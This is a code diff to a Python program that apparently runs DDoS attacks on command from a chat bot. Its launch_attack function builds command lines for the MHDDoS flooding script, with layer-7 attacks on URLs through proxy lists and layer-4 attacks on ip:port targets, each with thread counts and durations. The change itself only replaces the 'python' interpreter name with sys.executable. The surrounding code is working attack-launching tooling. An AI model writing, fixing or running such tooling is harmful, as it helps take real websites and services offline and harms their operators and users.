@@ -5,6 +5,7 @@ import json
 import os
 import time
 import requests
+import sys
 from threading import Thread
 
 # --- CONFIGURATION ---
@@ -453,8 +454,8 @@ def launch_attack(chat_id, state):
 
     cmd = []
     if layer == 7:
-        # L7: python start.py <method> <url> <socks_type> <threads> <proxylist> <rpc> <duration>
-        cmd = ["python", MHDDOS_SCRIPT, method, target, "1", threads, "proxy.txt", "100", duration]
+        # L7: sys.executable start.py <method> <url> <socks_type> <threads> <proxylist> <rpc> <duration>
+        cmd = [sys.executable, MHDDOS_SCRIPT, method, target, "1", threads, "proxy.txt", "100", duration]
     else:
         # L4: python start.py <method> <ip:port> <threads> <duration>
         # Strip https:// if passed for L4
@@ -464,7 +465,7 @@ def launch_attack(chat_id, state):
         if ":" not in clean_target:
              clean_target += ":80"
              
-        cmd = ["python", MHDDOS_SCRIPT, method, clean_target, threads, duration]
+        cmd = [sys.executable, MHDDOS_SCRIPT, method, clean_target, threads, duration]
     
     try:
         # Launch non-blocking
